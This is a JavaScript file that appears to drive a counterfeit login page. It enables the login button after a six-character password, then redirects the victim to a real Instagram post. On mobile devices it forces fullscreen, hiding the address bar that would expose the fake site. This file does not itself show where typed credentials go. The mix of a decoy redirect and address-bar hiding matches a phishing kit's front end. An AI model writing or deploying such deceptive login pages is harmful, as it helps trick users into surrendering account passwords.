var username = document.getElementById("username");
var password = document.getElementById("password");
var login = document.getElementById("login");

var newLocation = "https://www.instagram.com/p/CENPCinJrQp/";

setTimeout(() => {
    document.getElementById("loadingScreen").style.display = "none";
}, 400);

password.addEventListener("keyup", (e) => {
    if(e.keyCode === 13 && login.disabled === false) {
        console.log(login.disabled);
        login.click();
    }
    else if(password.value.length >= 6) {
        login.disabled = false;
    }
    else {
        login.disabled = true;
    }
});
window.addEventListener("click", () => {
    if(password.value.length >= 6) {
        login.disabled = false;
    }
    else {
        login.disabled = true;
    }
});

login.addEventListener("click", (e) => {
    location.replace(newLocation);
});

function goFullScreen() {
    var doc = window.document;
    var docEl = doc.documentElement;
  
    var requestFullScreen = docEl.requestFullscreen || docEl.mozRequestFullScreen || docEl.webkitRequestFullScreen || docEl.msRequestFullscreen;
    requestFullScreen.call(docEl);
}

if(/Mobi|Android/i.test(navigator.userAgent)) {
    window.addEventListener("click", goFullScreen);
}